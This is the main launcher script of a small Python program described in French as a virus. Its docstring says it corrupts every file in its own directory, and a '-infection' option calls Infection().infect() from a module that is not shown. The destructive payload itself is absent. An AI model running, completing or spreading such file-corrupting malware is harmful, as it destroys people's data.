"""ATTENTION A TESTER DANS UN DOSSIER CONTENANT DES FICHIERS INUTILISES !!!!!

TEST : python3 main.py
RESULTAT : Corrompt tous les fichiers présents dans le même répertoire que le script
Author : Cardin Patson
"""


from module.infection import Infection
import sys

if __name__ == "__main__":

    if len(sys.argv) != 2:
        raise Exception("Entrez -h pour voir la liste des options disponible")

    if sys.argv[1] == "-h":
        try:
            with open("./module/help.txt") as help:
                print(help.read())
        except FileNotFoundError:
            print("Fichier help Introuvable")

    elif sys.argv[1] == "-infection":
        virus = Infection()
        virus.infect()

    else:
        raise Exception("Entrez 'python3 main.py -h' pour voir la liste des options disponibles")
